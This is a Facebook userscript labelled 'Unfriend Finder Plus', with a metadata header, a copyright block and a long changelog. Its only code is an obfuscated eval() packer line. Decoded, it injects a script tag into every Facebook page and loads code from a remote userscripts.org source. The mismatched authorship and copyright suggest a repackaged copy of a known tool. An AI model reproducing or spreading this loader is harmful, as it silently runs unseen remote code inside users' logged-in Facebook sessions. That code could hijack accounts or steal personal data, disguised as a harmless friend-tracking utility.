// ==UserScript==
// @name           Unfriend Finder Plus
// @namespace      FB_unfriend_finder
// @description    Unfriend Finder is licensed under a Creative Commons Attribution
// @author         https://www.facebook.com/kareem.kasem
// @homepage       https://www.unfriendfinder.com/
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @include        htt*://*.facebook.com/*
// @match          http://*.facebook.com/*
// @match          https://*.facebook.com/*
// @version        40
// @date           2013-01-10
// @encoding       UTF-8
// @exclude        htt*://*static*.facebook.com*
// @exclude        htt*://*channel*.facebook.com*
// @exclude        htt*://developers.facebook.com/*
// @exclude        htt*://upload.facebook.com/*
// @exclude        htt*://*onnect.facebook.com/*
// @exclude        htt*://*acebook.com/connect*
// @exclude        htt*://*.facebook.com/plugins/*
// @exclude        htt*://*.facebook.com/l.php*
// @exclude        htt*://*.facebook.com/ai.php*
// @exclude        htt*://*.facebook.com/extern/*
// @exclude        htt*://*.facebook.com/pagelet/*
// @exclude        htt*://api.facebook.com/static/*
// @exclude        htt*://*.facebook.com/contact_importer/*
// @exclude        htt*://*.facebook.com/ajax/*
// @exclude        htt*://www.facebook.com/places/map*_iframe.php*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



//
//
//
//                            Unfriend Finder is Copyright (c) 2013 egylive.tv
//                                           https://www.egylive.tv
// Unfriend Finder is licensed under a Creative Commons Attribution-Noncommercial-No Derivative Works 3.0 Unported License
//              License information is available here: http://creativecommons.org/licenses/by-nc-nd/3.0/us/
//                   This full copyright section must be included in redistributions of this script
//
//
//
// Unfriend Finder
// Last changes: Dec 9 2012 6:00pm, vinodhkumarsampath@gmail.com dev build 40.810
//
// Main Changes
//
// Version 40:
//  [+] Added new Social Mode with Twitter. Likes and Comments with Facebook.
//  [*] Fixed display issues: Menubar link, broken layout in games and ads manager.
//  [*] Fixed cancellation of Pending Requests
//  [*] Fixed notification layout.
//  [*] False notifications should be fixed.
//  [*] Fixed Opera incompatibilities.
//  [*] Many more enhancements.
//
// No version 39
//
// Version 38:
//  [*] Fixed Unfriend informations on Timeline layout.
//  [*] Fixed Pending Requests loading forever.
//  [*] Fixed other various issues.
//
// Version 37:
//  [*] Fixed lag issue for some users on Firefox and Google Chrome.
//  [*] Fixed HTTPS issue with http:// profile pictures in awaitings requests.
//
// Version 36:
//  [*] Fixed issue affecting notifications, some of them were empty.
//  [*] Fixed major issue while loading lists for some people.
//  [*] Fixed deselection issue when trying to go back to another filter from Unfriends.
//  [*] Fixed news feed loading indefinitely while using Unfriends lists, lag issue. 
//  [*] Fixed arrows on contextual menus.
//  [*] Fixed Fanpage removed by Facebook and red box on Unfriends lists.
//  [*] Fixed position issue using the Tour tutorial.
//  [+] Added confirmation before hiding all unfriends/connections.
//  [+] Added Uninstall link in the filter menu.
// 
// Version 34:
//  [*] Fixed false notifications for friendlist having more than 3500 entries.
//  [*] Fixed menubar going on a new line for some people.
//  [*] Fixed Error message 0x0004 when refreshing page.
//  [*] Fixed display issue on accepted and ignored requests.
//  [*] Fixed ability to remove pending request.
//  [*] Fixed Hovercard issues.
//  [*] Fixed "Insecure content loaded" on Chrome, using HTTPS.
//  [*] Fixed critical error for some users.
//
// Version 33:
//  [*] Enhanced the way to start the script, avoiding more crashes.
//  [*] Changed Facebook database, more reliable.
//  [*] Enhanced Unfriends and Pending Requests detection.
//  [*] Fixed various display issues.
//
// Version 32:
//  [*] Fixed critical issue after a Facebook change.
//  [+] Added Unfriends summary on Facebook Timeline.
//  [*] Fixed nub position to left when sidebar is disabled.
//  [*] Improved webKit Notifications on Chrome.
//  [*] Updated the @match header for Chrome.
//  [*] Fixed Tour.
//  [*] Improved contextual dialogs.
//  [*] Fixed display issues with frames getting over games.
//  [*] Fixed display issues with ticker.
//  [*] Fixed notifications after a Facebook change.
//  [*] Fixed "Counter 0" when Menubar button is hidden.
//
// Version 31:
//  [*] Redrawn 16x16 "Unfriend" and "Pending Request" icons.
//  [+] Added beta support of the new FriendButton in the pending requests.
//  [*] Fixed issue in reset feature in settings.
//  [*] Fixed "Remove Connection" on pending requests.
//  [+] Added support of browser history on filters.
//  [*] Fixed bluebar links in new UI.
//  [+] Support for Internet Explorer, still few bugs but the script is working.
//  [+] Support for Safari on iPhone.
//  [*] Fixed hiding lists issue when "Unfriends" filter is clicked before the page has finished loading.
//  [*] Fixed "Hide All" link in Unfriends lists.
//  [+] Added Facebook hoverCard on profiles.
//  [+] Added new layout, "Blocks" style on unfriends list.
//  [*] Fixed issue with Greasemonkey in Ajax Requests.
//  [*] Fixed increasing notifications bug.
//  [*] Fixed filter compatibility for Google Chrome, Safari and Opera.
//  [+] Added support of webkitNotification on Chrome (Not supported by other browsers).
//  [+] Added ability to Rearrange "Unfriends" filter in the Favorites (new UI).
//  [+] Added ability to Add/Remove "Unfriends" filter to/from the Favorites (new UI).
//  [*] Fixed Messages section.
//
// Version 30:
//  [*] Fixed Filters for the new UI.
//  [*] Fixed 'Cancel All' feature on pending requests.
//  [*] Fixed display issues when switching from Group/Friends or other view to Unfriends Finder section.
//  [*] Fixed other various display issues.
//  [*] Updated Unfriends info box on profile.
//  [+] Added Esperanto, thanks to Lucas Larson.
//  [+] Added नेपाली, thanks to Binod Adhikary.
//  [+] Added বাংলা, thanks to Shahed Faisal.
//  [*] Updated non-execution for fanpages.
//
// Version 29:
//  [*] Fixed issue when trying to cancel a friend request.
//  [*] Languages updated.
//  [*] Fixed broken notifications.
//  [*] Fixed display issues.
//  [+] Added Latviešu, thanks to Viesturs Eihentāls.
//
// Version 28:
//  [*] Fixed Spammy Links issue.
//  [*] Languages updated, thanks to Jay Ranson for English UK, Benjamin Schwarz for Deutsch, and Cüneyt Oktay for Turkish.
//  [*] Fixed "<your profile> was in your friendlist" issue.
//  [+] Added मराठी, thanks to Bhooshan Harake.
//  [+] Added தமிழ், thanks to Jal Desai.
//
// Version 27:
//  [+] Added loading indicator in filter to show loading when checking unfriends.
//  [-] Removed reminder beepers on unfriends/ignored requests.
//  [*] Fixed issues with repeating notifications.
//  [*] Fixed issue with ability to Always Hide/Block an unfriend with Shift/Shift+Ctrl key.
//  [*] Changed Fanpage ID after being deleted by Facebook.
//  [*] Fixed issue with multiple instance of Bottop-right nub and Settings link in menubar.
//  [*] Probably fixed cache issue when Pending Request.
//  [*] Fixed issue with Information box on profile, which was not displayed in previous versions due to a Facebook change.
//  [*] Won't notify more than 3 times the same Unfriend.
//  [*] Fixed display issues.
//  [*] Fixed binding key issues on Opera.
//  [+] Added 한국어, thanks to Jungwook Lee.
//  [+] Added ภาษาไทย, thanks to Globe Vgl.
//  [+] Added Euskara, thanks to Arkaitz Luzuriaga.
//  [+] Added Lingua Latina, thanks to Sawyer Morgan.
//
// Version 26:
//  [*] Added @exclude for useless pages.
//  [+] Added paging for Unfriends & Reappeared.
//  [+] Added paging settings.
//  [*] Sorted profiles in lists by dates on Chrome.
//  [*] Fixed the loss of links with FFixer when having too much links in menubar.
//  [*] Fixed bug with beepers on Chrome.
//  [*] Fixed crash when 3rd party cookies were not enabled. Using Ajax() instead of XMLHttpRequest on Greasemonkey.
//  [*] Fixed HTTPS issue.
//  [+] Added dates when adding pending requests.
//  [*] Fixed wrong status set to 'Deleted or Hidden' due to a Facebook change.
//  [+] Added Nub container in bottom-right to bind beepers.
//  [+] Added an option in this container to temporary enable/disable the script.
//  [+] Added Filipino, thanks to Sebastian Gallup.
//  [+] Added ქართული, thanks to Quji Bichia, Beqa

